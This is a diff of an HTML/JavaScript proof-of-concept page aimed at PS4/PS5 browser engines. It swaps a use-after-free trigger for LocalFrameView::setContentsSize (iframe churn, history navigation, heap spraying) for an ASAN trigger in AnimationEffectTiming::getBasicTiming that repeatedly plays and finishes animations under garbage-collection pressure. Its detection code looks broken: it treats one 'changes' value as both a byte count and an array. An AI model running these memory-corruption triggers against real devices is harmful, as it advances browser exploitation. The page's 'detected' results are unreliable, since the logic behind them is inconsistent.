@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FrameView UAF PoC (PS4/PS5?)</title>
+    <title>AnimationEffectTiming ASAN PoC (PS4/PS5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -25,14 +25,20 @@
             border: 1px solid #ccc;
             padding: 10px;
         }
+        #target {
+            width: 100px;
+            height: 100px;
+            background: red;
+        }
     </style>
 </head>
 <body>
-    <h1>FrameView UAF PoC</h1>
-    <p>Click to test UAF in LocalFrameView::setContentsSize.</p>
-    <button id="trigger">TEST UAF</button>
+    <h1>AnimationEffectTiming ASAN PoC</h1>
+    <p>Click to test ASAN issue in AnimationEffectTiming::getBasicTiming.</p>
+    <button id="trigger">TEST ANIMATION</button>
     <div id="status">Idle...</div>
     <div id="console"></div>
+    <div id="target"></div>
     <script>
         const status = document.getElementById('status');
         const consoleDiv = document.getElementById('console');
@@ -50,26 +56,6 @@
             for (let i = 0; i < 200; i++) {
                 new ArrayBuffer(2 * 1024 * 1024);
             }
-        }
-
-        function changeContentSize() {
-            document.body.style.width = `${Math.random() * 1000 + 500}px`;
-            document.body.style.height = `${Math.random() * 1000 + 500}px`;
-            document.body.offsetHeight; // Force layout
-        }
-
-        function navigateHistory() {
-            for (let i = 0; i < 10; i++) {
-                history.pushState({ page: i }, `Page ${i}`, `#page${i}`);
-            }
-            history.back();
-        }
-
-        function createIframe() {
-            const iframe = document.createElement('iframe');
-            iframe.src = 'about:blank';
-            document.body.appendChild(iframe);
-            return iframe;
         }
 
         function checkMemoryChanges() {
@@ -92,7 +78,7 @@
             };
         }
 
-        async function detectUAF() {
+        async function detectAnimationIssue() {
             attemptCount++;
             status.textContent = `Attempt ${attemptCount} in progress...`;
             log(`Attempt ${attemptCount} started`);
@@ -100,49 +86,59 @@
             try {
                 // Create memory checker
                 const check = checkMemoryChanges();
-                const iframes = [];
 
-                // Create iframes
-                for (let i = 0; i < 5; i++) {
-                    iframes.push(createIframe());
+                // Create animation
+                const target = document.getElementById('target');
+                const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
+                const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
+                let timeline;
+                try {
+                    timeline = new ScrollTimeline({ source: document.documentElement });
+                } catch (e) {
+                    log(`ScrollTimeline not supported: ${e.message}`);
+                    timeline = document.timeline;
                 }
+                const animation = new Animation(effect, timeline);
 
-                // Stress heap and trigger navigation
+                // Trigger animation and manipulate
                 const interval = setInterval(() => {
-                    changeContentSize();
-                    navigateHistory();
-                    stressGC();
-                    // Remove and recreate iframes
-                    iframes.forEach(iframe => iframe.remove());
-                    for (let i = 0; i < 5; i++) {
-                        iframes.push(createIframe());
+                    try {
+                        animation.play();
+                        animation.finish();
+                        effect.getComputedTiming();
+                        stressGC();
+                    } catch (e) {
+                        log(`Error in animation: ${e.message}`);
                     }
-                }, 100);
+                }, 10);
 
                 // Check for memory changes or crash
                 setTimeout(() => {
                     clearInterval(interval);
+                    try {
+                        effect.getComputedTiming(); // Trigger getBasicTiming
+                    } catch (e) {
+                        log(`Error in getComputedTiming: ${e.message}`);
+                    }
                     const result = check();
                     if (result.changes > 0) {
-                        status.textContent = `UAF detected! ${result.changes} bytes changed`;
-                        log(`UAF detected! ${result.changes} bytes changed`);
+                        status.textContent = `Issue detected! ${result.changes} bytes changed`;
+                        log(`Issue detected! ${result.changes} bytes changed`);
                         log(`Changes: ${result.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                     } else {
                         stressGC();
                         setTimeout(() => {
                             const secondResult = check();
                             if (secondResult.changes > 0) {
-                                status.textContent = `UAF detected after GC! ${secondResult.changes} bytes changed`;
-                                log(`UAF detected after GC! ${secondResult.changes} bytes changed`);
+                                status.textContent = `Issue detected after GC! ${secondResult.changes} bytes changed`;
+                                log(`Issue detected after GC! ${secondResult.changes} bytes changed`);
                                 log(`Changes: ${secondResult.changes.map(([k, v]) => `${k} (${v} bytes)`).join(', ')}`);
                             } else {
-                                status.textContent = 'No UAF detected';
-                                log('No UAF detected');
+                                status.textContent = 'No issue detected';
+                                log('No issue detected');
                             }
                         }, 10);
                     }
-                    // Clean up iframes
-                    iframes.forEach(iframe => iframe.remove());
                 }, 2000);
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
@@ -152,7 +148,7 @@
 
         document.getElementById('trigger').addEventListener('click', async () => {
             try {
-                await detectUAF();
+                await detectAnimationIssue();
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
                 log(`Error: ${err.message}`);
